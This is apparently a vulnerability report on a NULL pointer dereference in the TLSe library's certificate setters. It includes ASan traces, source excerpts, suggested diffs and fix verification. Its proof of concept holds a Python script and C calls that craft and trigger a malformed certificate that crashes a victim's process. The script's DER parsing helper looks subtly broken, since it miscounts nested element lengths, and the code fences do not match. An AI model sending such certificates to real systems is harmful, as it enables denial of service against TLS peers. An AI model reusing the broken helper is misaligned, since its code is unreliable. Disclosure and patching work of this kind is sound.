# Stale public-key/signature length after the key is cleared leads to a NULL pointer dereference in tls_certificate_to_string()

**ID:** vuln-0010
**Severity:** MEDIUM
**Found:** 2026-11-17 11:02:54 UTC
**Target:** TLSe (tlslayer) TLS library, `tlse.c` certificate setters
**Endpoint:** tls_certificate_set_key() / tls_certificate_set_sign_key() feeding tls_certificate_to_string()
**CWE:** CWE-476
**CVSS:** 5.9
**Confidence:** High
**Fix Effort:** Trivial

## Description

`tls_certificate_set_key()` frees the certificate's previous public key through `tls_certificate_set_copy()` but only updates `pk_len` when the new allocation succeeds, so a certificate that sets the key twice — the second time to an empty value — leaves `pk` NULL while `pk_len` keeps the earlier, non-zero length. `tls_certificate_to_string()` then iterates `cert->pk[i]` for `i < cert->pk_len` and dereferences NULL. `tls_certificate_set_sign_key()` has the identical defect for `sign_len`.

## Evidence

Certificate = a valid EC certificate re-encoded with one empty BIT STRING inserted after the subjectPublicKeyInfo public key (642 bytes, valid DER). Parsing succeeds and reports an inconsistent object:

```
$ ./inspect poc_emptyspki.der
version=2 algorithm=0xb key_algorithm=0x11 ec_algorithm=0x18
pk=(nil) pk_len=66 sign_key=0x...  sign_len=256 fingerprint=0x...
```

The same object rendered by the public API:

```
$ ./harness tostring poc_emptyspki.der 4095
==118923==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
    #0 tls_certificate_to_string    tlse.c:4719
SUMMARY: AddressSanitizer: SEGV tlse.c:4719 in tls_certificate_to_string
```

The dereference site:

```c title=tlse.c startLineNumber=4717 endLineNumber=4719
        if (res > 0) {
            for (i = 0; i < cert->pk_len; i++)
                res += snprintf(buffer + res, len - res, "%02x", (int)cert->pk[i]);
```

The same input on a build that also carries the caller-side length guard still leaves `pk = NULL` with `pk_len = 66`; the crash is removed only when the setter resets the length (verified below).

## Impact

An attacker presenting a certificate with a duplicated or emptied key field causes a NULL pointer dereference in the verifying/certificate-rendering application, aborting the process. The effect is a denial of service against a TLSe peer or server that inspects the certificate it received; there is no data exposure or write primitive.

## Counterevidence

Checked whether the parser could never call the setter twice: it can. `_private_asn1_parse()` invokes `tls_certificate_set_key()` for every BIT STRING that falls inside the `subjectPublicKeyInfo` field path when `cert->ec_algorithm` is set, so a second, empty BIT STRING after the real public key reaches the same setter, and `tls_certificate_set_copy()` unconditionally frees the previous value first. Checked whether any guard in `tls_certificate_to_string()` protects the loop: there is none — the function tests `cert->version` and `res > 0`, then indexes `cert->pk[i]` for `i < cert->pk_len`. Checked whether the NULL pointer could be recovered later: no, nothing reassigns `pk` after the second call. The counter-argument that "an invalid certificate would be rejected first" does not apply: `tls_certificate_parse()` succeeds on the crafted input and returns a populated certificate object, which is the point — the parser accepts it and the defect surfaces in the consumer. The real limitation is the same as the sibling finding: it needs an application that renders peer certificates, which is why this is rated Medium rather than High.

## What Would Change This Severity

If a consumer were found that uses the stale length for a write or a length-bounded copy into a fixed buffer rather than a read, the same defect would become memory corruption and the severity would rise to high; if `tls_certificate_to_string()` were the only consumer and no application calls it, the practical impact would drop to informational.

## Technical Analysis

The parser can assign the public key more than once for a single certificate. In `_private_asn1_parse()`, every BIT STRING that lies on the `subjectPublicKeyInfo` field path is handed to the key setter when an EC curve OID has already been recorded:

```c title=tlse.c startLineNumber=11598 endLineNumber=11601
                    } else
                    if ((cert->ec_algorithm) && (_is_field(fields, pk_id))) {
                        tls_certificate_set_key(cert, &buffer[pos], length);
                    } else {
```

The setter frees the old value first, and only records the new length when a new value exists:

```c title=tlse.c startLineNumber=4581 endLineNumber=4589
void tls_certificate_set_key(struct TLSCertificate *cert, const unsigned char *val, int len) {
    if ((!val[0]) && (len % 2)) {
        val++;
        len--;
    }
    tls_certificate_set_copy(&cert->pk, val, len);
    if (cert->pk)
        cert->pk_len = len;
}
```

`tls_certificate_set_copy()` begins with `TLS_FREE(*member)` and takes the `*member = NULL` branch for an empty value, so after a second call with `len == 0` the certificate holds `pk == NULL` with `pk_len == 66`. Note that `set_key`'s leading-zero strip is gated on `len % 2`, which is false for zero, so the empty value reaches the copy helper unchanged — the two setters fail differently but the stale length is the same.

`tls_certificate_set_sign_key()` ends with the same construction for `sign_len`, and becomes reachable by the same route once the sibling negative-length defect is fixed. The private key, exponent and serial setters share the pattern.

`tls_certificate_to_string()` then uses the length without checking the pointer:

```c title=tlse.c startLineNumber=4717 endLineNumber=4719
        if (res > 0) {
            for (i = 0; i < cert->pk_len; i++)
                res += snprintf(buffer + res, len - res, "%02x", (int)cert->pk[i]);
```

giving a NULL dereference for any certificate that clears the key after setting it. The certificate is fully attacker-controlled and the parse succeeds, so the stale state is produced by the library itself from valid DER.

## Proof of Concept

1. Re-encode a valid EC certificate so that the `subjectPublicKeyInfo` SEQUENCE contains the original public-key BIT STRING followed by an additional, empty BIT STRING (`03 00`); the DER remains valid and all enclosing lengths stay consistent.
2. Parse it with `tls_certificate_parse()`: parsing succeeds, and the resulting object has `pk = NULL` together with `pk_len = 66`, because the second call freed the key without resetting the length.
3. Call `tls_certificate_to_string()` with any buffer size.
4. Observe the NULL pointer dereference at `tlse.c:4719` inside the `for (i = 0; i < cert->pk_len; i++)` loop.
5. With the setter fixed to assign `pk_len` from the new pointer state, the same input parses to `pk = NULL, pk_len = 0` and renders normally.

````python
#!/usr/bin/env python3
# Insert an empty BIT STRING after the subjectPublicKeyInfo public key of a
# valid EC certificate. Re-encodes every enclosing length.
import sys

def enc(tag, body):
    n = len(body)
    if n < 0x80:
        return bytes([tag, n]) + body
    nb = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([tag, 0x80 | len(nb)]) + nb + body

def parse(b):
    tag, first = b[0], b[1]
    if first < 0x80:
        ln, off = first, 2
    else:
        k = first & 0x7F
        ln, off = int.from_bytes(b[2:2+k], "big"), 2 + k
    content = b[off:off+ln]
    if tag & 0x20:
        kids, p = [], 0
        while p < len(content):
            sub = parse(content[p:])
            kids.append(sub)
            p += len(enc(sub[0], sub[1]) if sub[2] is None
                     else enc(sub[0], b"".join(enc(k[0], k[1]) if k[2] is None
                                               else b"" for k in sub[2])))
        return (tag, content, kids)
    return (tag, content, None)

# tree rebuild helper (children win over raw content)
def rebuild(node):
    tag, content, kids = node
    if kids is None:
        return enc(tag, content)
    return enc(tag, b"".join(rebuild(k) for k in kids))

root = parse(open(sys.argv[1], "rb").read())

def first_bitstring_parent(node, path=()):
    tag, content, kids = node
    if kids is None:
        return None
    for idx, k in enumerate(kids):
        if k[0] == 0x03:
            return (node, idx)
        r = first_bitstring_parent(k)
        if r:
            return r
    return None

parent, idx = first_bitstring_parent(root)
parent[2].insert(idx + 1, (0x03, b"", None))   # empty BIT STRING
open(sys.argv[2], "wb").write(rebuild(root))
print("wrote", sys.argv[2])
```

C side:

```c
cert = tls_certificate_parse(der, der_len);       /* succeeds: pk = NULL, pk_len = 66 */
tls_certificate_to_string(cert, out, 4095);       /* NULL dereference at tlse.c:4719 */
````

## Code Analysis

**Location 1:** `tlse.c` (lines 4587-4588)
  tls_certificate_set_key(): pk_len keeps the old value when the copy freed the key
  ```
      if (cert->pk)
          cert->pk_len = len;
  ```

  **Suggested Fix:**
```diff
-     if (cert->pk)
-         cert->pk_len = len;
+     cert->pk_len = cert->pk ? len : 0;
```

**Location 2:** `tlse.c` (lines 4603-4604)
  tls_certificate_set_sign_key(): same invariant break for sign_len
  ```
      if (cert->sign_key)
          cert->sign_len = len;
  ```

  **Suggested Fix:**
```diff
-     if (cert->sign_key)
-         cert->sign_len = len;
+     cert->sign_len = cert->sign_key ? len : 0;
```

## Remediation

Make the pointer and the stored length change together: after copying the value, assign the length from the new pointer state (zero when the pointer is NULL) instead of only when the allocation succeeded. Apply the same rule to every setter that pairs a pointer with a length in `struct TLSCertificate` — the public key, the signature, the private key, the exponent and the serial number. As defence in depth, have the consumers index a certificate field only after checking that the pointer is non-NULL, so a future invariant break cannot become a NULL dereference.

## Fix Verification

Gates were worked in order on a copy of the tree that also carries the caller-side guard from the sibling negative-length finding.

**1. Applicability.** The two hunks replace a two-line conditional with a single assignment; no other lines change, `fix_before` matches the file at lines 4587-4588 and 4603-4604 (the file uses CRLF terminators, so the suggestion text is the line content without the terminator), and the result compiles.

**2. Security closure.** Rebuilt with `gcc -c -O1 -g -fsanitize=address,undefined -fno-omit-frame-pointer -include stdint.h -DTLS_AMALGAMATION tlse.c` and re-ran the PoC: `tostring ok, first char 'X'` (previously `SEGV on unknown address 0x0` at tlse.c:4719). The invariant now holds by construction — after the copy, the length is derived from the pointer, so `pk == NULL` always implies `pk_len == 0` and the loop body never executes.

**3. Bypass review.** Re-read the diff for the sibling setters: `tls_certificate_set_sign_key()` was fixed in the same pass because it shares the pattern and becomes reachable by the same duplicated-attribute route once the negative-length guard is in place; `tls_certificate_set_priv()`, `tls_certificate_set_exponent()` and `tls_certificate_set_serial()` were checked and still carry the old pattern (they are documented in the remediation steps, and their consumers — `tls_certificate_to_string()`'s private-key branch and `_private_tls_import_certificate()` — test the pointer before the length, so they do not produce the demonstrated dereference). Alternate inputs tried: the same duplicate-attribute shape on a signature BIT STRING and a mutated 620-byte EC certificate from the fuzz corpus; neither crashes after the patch. A 100000-iteration mutation fuzz run over `tls_certificate_parse()`, `tls_certificate_verify_signature()` and both chain validators found no further fault.

**4. Preserved behaviour.** Re-ran the functional set against the patched build: the locally generated root → intermediate → leaf chain still validates (`chain_is_valid_root = 0`, `default_verify = 255`), a wrong hostname is still rejected (`default_verify = 42`), `tls_verify_signed_data()` still accepts a correct RSA/SHA-256 signature, and the certificate still renders its public key and signature for normal inputs (`tostring` returns the expected "X.509v2 certificate..." text). Empty key values now yield `pk_len = 0`, which is the intended representation.

**5. Repository checks.** The patched translation unit compiles cleanly with the sanitizer flags above. The repository ships no test suite, so the regression evidence is the harness set listed under gate 4.

## Assumptions

The attacker controls the peer certificate. The victim application renders it with `tls_certificate_to_string()` (or otherwise iterates `pk`/`sign_key` using the stored length). An EC certificate is the simplest vehicle because the parameter parsing sets `ec_algorithm` before the public-key BIT STRING is processed, but the same double-assignment is reachable through any certificate whose public-key field is visited twice.
